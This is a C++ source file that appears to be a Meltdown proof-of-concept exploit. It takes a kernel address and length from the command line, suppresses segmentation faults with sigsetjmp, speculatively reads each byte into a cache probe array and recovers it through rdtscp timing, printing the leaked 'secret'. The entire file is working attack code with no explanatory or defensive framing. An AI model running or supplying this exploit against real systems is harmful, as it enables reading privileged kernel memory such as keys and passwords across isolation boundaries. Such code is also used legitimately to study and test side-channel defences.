#include <cstdlib>
#include <algorithm>
#include <iostream>
#include <vector>
#include <cstring>
#include <climits>
#include <csignal>
#include <csetjmp>
#include <unistd.h>
#include <string>
#include <fcntl.h>
#include <x86intrin.h>

constexpr unsigned page_size = 4096;
constexpr unsigned possible_value_nums = 256;
constexpr int max_num_predicts = 100;

static uint8_t *cache;
static std::vector<int> probe_sequence;
static jmp_buf jmp_buffer;
static int fd;

typedef void handler_t(int);

void init_probe_sequence(void);
void flush_cache(void);
void sigsegv_handler(int sig);
static inline void mem_access(void *p);
int read_byte(char* addr);
void flush_cache(void);
static inline int get_access_time(char *addr);
uint8_t recover_secret(void);
static void __attribute__((noinline)) meltdown_attack(char* addr);
handler_t *Signal(int signum, handler_t *handler);
void unix_error(char *msg);

int main(int argc, char *argv[])
{
    init_probe_sequence();
    cache = (uint8_t *) aligned_alloc(page_size, page_size * possible_value_nums);
    memset(cache, 0, page_size * possible_value_nums);
    std::vector<int> count(256, 0);
    std::string secret_recovered;

    unsigned long addr_input;
    unsigned long size;

    sscanf(argv[1], "%lx", &addr_input);
    sscanf(argv[2], "%lx", &size);
    
    char *addr = (char *) addr_input;

    if ((fd = open("/proc/version", O_RDONLY)) < 0)
        unix_error((char *) "failed to open /proc/version");

    Signal(SIGSEGV, sigsegv_handler);
    
    for (int i = 0; i != (int) size; ++i)
    {
        count.assign(256, 0);
        for (int j = 0; j != max_num_predicts; ++j)
            ++count[read_byte(addr)];
        auto max_position = std::max_element(count.begin(), count.end());
        std::cout << "char at position " << i << " is " << (char) (max_position - count.begin()) << " with "
        << count[max_position - count.begin()] << "% certainty" << std::endl;
        secret_recovered.push_back((char) (max_position - count.begin()));
        ++addr;
    }
    std::cout << "secret recovered: " << secret_recovered << std::endl;
    free(cache);
    return 0;
}

void sigsegv_handler(int sig)
{
    siglongjmp(jmp_buffer, 1);
    return;
}

void init_probe_sequence(void)
{
    for (int i = 0; i != possible_value_nums; ++i)
        probe_sequence.push_back(i);
}

void flush_cache(void)
{
    for (int i = 0; i != possible_value_nums; ++i)
        __builtin_ia32_clflush((void *) ((unsigned long) cache + page_size * i));
}

static inline void mem_access(void *p)
{
    asm volatile("movl (%0), %%eax\n" : : "c"(p) : "eax");
}

int read_byte(char* addr)
{
    static char buf[256];
    memset(cache, 0, page_size * possible_value_nums);
    if (pread(fd, buf, sizeof(buf), 0) < 0)
        unix_error((char *) "pread failed");
    flush_cache();
    meltdown_attack(addr);
    return recover_secret();
}

static inline int get_access_time(char *addr)
{
    unsigned long long time_begin, time_end;
    unsigned junk;
    time_begin = __rdtscp(&junk);
    mem_access(addr);
    time_end = __rdtscp(&junk);
    return time_end - time_begin;
}

uint8_t recover_secret(void)
{
    int value_probe;
    char *addr;

    int time;
    int min_time = INT_MAX;
    int hit_value = 0;

    std::random_shuffle(probe_sequence.begin(), probe_sequence.end());
    for (int i = 0; i != possible_value_nums; ++i)
    {
        value_probe = probe_sequence[i];
        addr = (char *) ((unsigned long) cache + value_probe * page_size);
        time = get_access_time(addr);
        if (time < min_time)
        {
            hit_value = value_probe;
            min_time = time;
        }
    }
    return hit_value;
}

static void __attribute__((noinline)) meltdown_attack(char* addr)
{
    if (!sigsetjmp(jmp_buffer, 1)) {
    __asm__ volatile(
		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

        "retry:\n\t"
		"movzx (%[addr]), %%rax\n\t"
        "shl $12, %%rax\n\t"
        "mov (%[target], %%rax, 1), %%rbx\n\t"
		"jz retry\n"
        :
		: [target] "r" (cache),
		  [addr] "r" (addr)
		: "rax","rbx"
	);
    }
    else return;
}

// wrapper for the sigaction function
handler_t *Signal(int signum, handler_t *handler)
{
    struct sigaction action, old_action;

    action.sa_handler = handler;
    sigemptyset(&action.sa_mask); /* block sigs of type being handled */
    sigaddset(&action.sa_mask, SIGSEGV);
    action.sa_flags = SA_INTERRUPT; /* restart syscalls if possible */

    if (sigaction(signum, &action, &old_action) < 0)
        unix_error((char *) "Signal error");
    return (old_action.sa_handler);
}

// unix-style error routine
void unix_error(char *msg)
{
    fprintf(stdout, "%s: %s\n", msg, strerror(errno));
    exit(1);
}